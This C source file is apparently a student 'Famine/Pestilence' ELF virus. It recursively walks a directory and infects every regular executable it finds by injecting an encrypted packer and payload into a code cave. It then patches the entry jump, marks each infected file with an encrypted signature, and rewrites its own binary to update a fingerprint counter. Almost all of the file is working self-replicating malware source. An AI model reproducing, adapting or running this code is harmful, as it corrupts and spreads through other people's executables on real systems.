#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <elf.h>
#include <dirent.h>
#include <stddef.h>

#include "map.h"
#include "utils.h"
#include "bss.h"
#include "text.h"
#include "pestilence.h"
#include "syscall.h"
#include "famine.h"

extern void end();
void famine(void);

#define JMP_OFFSET 0x6
#define JMP_SIZE 4

void	__attribute__((naked)) _start(void)
{
	__asm__ ("call famine\n"
			 "jmp end    \n");
}

static int	patch_new_file(t_data *data, const char *filename) {

	_syscall(SYS_unlink, filename);

	int fd = _syscall(SYS_open, filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
	if (fd == -1)
		return 1;

	if (_syscall(SYS_write, fd, data->file, data->size) == -1) {
		_syscall(SYS_close, fd);
		return 1;
	}

	_syscall(SYS_close, fd);

	return 0;
}

static int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
	return (int64_t)to - (int64_t)from - (int64_t)offset;
}

static int packer(t_data *data) {
	data->packer.p_size = (size_t)&packer_end - (size_t)&packer_start;

	if (text(data, data->packer.p_size) != 0) {
		return 1;
	}

	return 0;
}

#define HASH_KEY 0x9e3779b97f4a7c15

void increment_counter(char *counter) {
    for (int i = 3; i >= 0; i--) {
        if (counter[i] == '9') {
            counter[i] = '0';
        } else {
            counter[i] += 1;
            break;
        }
    }
}

static int self_fingerprint(t_data *data) {

	struct stat st;
	int fd = _syscall(SYS_open, data->self_name, O_RDONLY);
	//int fd = _syscall(SYS_open, self_name, O_RDWR);

	if (fd == -1) {
		return -1;
	}

	if (_syscall(SYS_fstat, fd, &st) == -1) {
		_syscall(SYS_close, fd);
		return -1;
	}


	uint8_t *self = (uint8_t *)_syscall(SYS_mmap, 0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (self == MAP_FAILED) {
		char msg[] = "mmap failed\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		_syscall(SYS_close, fd);
		return -1;
	}

	uint8_t *ptr = self;
	char buf[4096];

	while (1) {
		ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
		if (ret == -1) {
			_syscall(SYS_close, fd);
			_syscall(SYS_munmap, self, st.st_size);
			return -1;
		}
		else if (ret == 0)
			break;
		ft_memcpy(ptr, buf, ret);
		ptr += ret;
	}

	_syscall(SYS_close, fd);
	_syscall(SYS_unlink, data->self_name);
	/* mprotect */

	//_syscall(SYS_mprotect, self, st.st_size, PROT_READ | PROT_WRITE | PROT_EXEC);


	char signature[26] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c\x2e\x07\xcb\x01\x55\xe6\x7e\x00";

	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);


	char *found = ft_memmem(self, st.st_size, signature, ft_strlen(signature));
	//
	_syscall(SYS_write, 2, found, ft_strlen(found));

	char *counter = found + 37;

	increment_counter(counter);

	fd = _syscall(SYS_open, data->self_name, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode);

	_syscall(SYS_write, fd, self, st.st_size);

	_syscall(SYS_munmap, self, st.st_size);


	return 0;
}

static int self_name(t_data *data) {
	char buf[PATH_MAX];
	char proc_self_exe[] = "/proc/self/exe";
	int ret = _syscall(SYS_readlink, proc_self_exe, buf, PATH_MAX);
	if (ret == -1) {
		return -1;
	}
	buf[ret] = '\0';
	ft_strlcpy(data->self_name, buf, sizeof(data->self_name));
	//_syscall(SYS_write, 2, data->self_name, ft_strlen(data->self_name));
	return 0;
}

/* get argv[0] */
static int update_fingerprint(char *fingerprint, t_data *data) {

	//_syscall(SYS_write, 2, buf, ft_strlen(buf));

	/* increment my fingetprint */

	uint64_t hash = HASH_KEY;
	//size_t size_self = ft_strlen(data->self_name);
	size_t size_target = ft_strlen(data->target_name);

	/* hash with our argv[0] */
	//for (size_t i = 0; i < size_self; i++) {
	//	hash ^= (data->self_name[i] << i % 8);
	//}

	/* hash with with the target file */
	for (size_t i = 0; i < size_target; i++) {
		hash ^= (data->target_name[i] << i % 8);
	}

	/* make the hash printable */
	for (size_t i = 0; i < 8; i++) {
		fingerprint[i] = (hash % 95) + 32;
		hash /= 95;
	}

	return 0;
}

static void init_patch(t_patch *patch, t_data *data, size_t jmp_rel_offset) {

	ft_memset(patch, 0, sizeof(t_patch));

	/* calculate the difference between the cave and the packer 
	 * will always be positive cause .data is after the .text */
	uint64_t addr_diff = data->cave.addr - data->packer.addr;

	patch->jmp = (int32_t)(addr_diff - jmp_rel_offset - sizeof(int32_t) - 1);

	char signature[43] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c\x2e\x07\xcb\x01\x55\xe6\x7e\x5c\x67\x5f\xca\x0d\x45\xff\x77\x13\x3f\x13\x83\x49\x07\xae\x25\x76\x00";

	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);

	update_fingerprint(&signature[ft_strlen(signature) - 14], data);

	ft_strlcpy(patch->signature, signature, SIGNATURE_SIZE);

	patch->mprotect_size = data->data_page_size;

	patch->decrypt_size = data->cave.p_size;

	patch->virus_offset = addr_diff;

	patch->key = gen_key_64();
}

static int packer_patch(t_data *data) {
	if (self_name(data) != 0) {
		char msg[] = "Error getting self name\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		return 1;
	}

	if (self_fingerprint(data) != 0) {
		char msg[] = "Error updating fingerprint\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		return 1;
	}

	size_t jmp_rel_offset = (size_t)&jmp_rel - (size_t)&packer_start;

	t_patch patch;
	init_patch(&patch, data, jmp_rel_offset);

	/* copy the packer */
	ft_memcpy(data->file + data->packer.offset, &packer_start, data->packer.p_size);
	/* patch the packer, jmp_rel offset is where the data of the packer is stored */
	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &patch, sizeof(t_patch));

	data->key = patch.key;

	return 0;

}

static int	inject(t_data *data) {

	if (packer(data) != 0) {
		char msg[] = "Error packing\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		return 1;
	}

	if (bss(data, data->cave.p_size) != 0) {
		char msg[] = "Error bss\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		return 1;
	}

	packer_patch(data);
	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->packer.old_entry, JMP_OFFSET + JMP_SIZE);
	//data->cave.rel_jmp = (int32_t)((int64_t)data->cave.addr - (int64_t)(data->packer.old_entry - JMP_OFFSET - JMP_SIZE)); big problems

	ft_memcpy(data->file + data->cave.offset, &_start, data->cave.p_size);

	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);

	encrypt(data->file + data->cave.offset, data->cave.p_size, data->key);

	return 0;
}

static int	already_patched(t_data *data)
{
	char signature[26] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c\x2e\x07\xcb\x01\x55\xe6\x7e\x00";

	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);

	_syscall(SYS_write, 2, signature, 25);

	data->signature = search_signature(data, signature);
	if (data->signature != NULL) {
		char msg[] = "Already patched\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		_syscall(SYS_write, 2, data->signature, ft_strlen(data->signature));
		return 1;
	}
	return 0;
}

static int	infect(const char *filename)
{

	t_data data;
	ft_memset(&data, 0, sizeof(t_data));

	ft_strlcpy(data.target_name, filename, sizeof(data.target_name));

	/* calculate the size of the payload before the mapping */
	data.cave.p_size = (size_t)&end - (size_t)&_start;

	if (map_file(filename, &data) != 0) {
		return 1;
	}

	updade_hdr(&data);

	if (already_patched(&data) != 0) {
		free_data(&data);
		return 1;
	}

	if (inject(&data) != 0) {
		char msg[] = "Error injecting\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		free_data(&data);
		return 1;
	}

	if (patch_new_file(&data, filename) != 0) {
		char msg[] = "Error patching new file\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		free_data(&data);
		return 1;
	}

	//_syscall(SYS_msync, data.file, data.size, MS_SYNC);
	free_data(&data);

	return 0;
}

static void	open_file(char *file)
{

	int fd = _syscall(SYS_open, file, O_RDONLY);
	if (fd < 0)
		return ;

	char buf[PATH_MAX];
	struct dirent *dir;
	ssize_t ret;

	for(;;)
	{
		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (struct dirent *)(buf + i);

			if (dir->d_name[0] == '.'
				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
				continue;
			
			if (dir->d_type == DT_REG) {

				char new_path[PATH_MAX];

				make_path(new_path, file, dir->d_name);

				//_syscall(SYS_write, 2, new_path, ft_strlen(new_path));

				if (infect(new_path) == 0) {
					//
					//pid_t pid = _syscall(SYS_fork);
					//
					//if (pid == 0) {
					//
					//	int devnull = _syscall(SYS_open, "/dev/null", O_RDWR);
					//	if (devnull < 0)
					//		_syscall(SYS_exit, 0);
					//
					//	if (_syscall(SYS_dup2, devnull, 0) < 0) {
					//		_syscall(SYS_close, devnull);
					//		_syscall(SYS_exit, 0);
					//	}
					//
					//	if (_syscall(SYS_dup2, devnull, 1) < 0) {
					//		_syscall(SYS_close, devnull);
					//		_syscall(SYS_exit, 0);
					//	}
					//
					//	if (_syscall(SYS_dup2, devnull, 2) < 0) {
					//		_syscall(SYS_close, devnull);
					//		_syscall(SYS_exit, 0);
					//	}
					//
					//	_syscall(SYS_close, devnull);
					//
					//	_syscall(SYS_execve, new_path, NULL, NULL);
					//} else {
					//	_syscall(SYS_wait4, pid, NULL, 0, NULL);
					//}
				}

			} else if (dir->d_type == DT_DIR) {
				char new_path[PATH_MAX];

				make_path(new_path, file, dir->d_name);

				open_file(new_path);
			}
		}
	}
	_syscall(SYS_close, fd);
}

void	famine(void)
{
	//if (check_ptrace() != 0) 
	//	_syscall(SYS_exit, 1);

	char p1[] = "./tmp";
	char *paths[] = {
		p1,
		(void *)0,
	};

	for (int i = 0; paths[i]; i++)
		open_file(paths[i]);

}
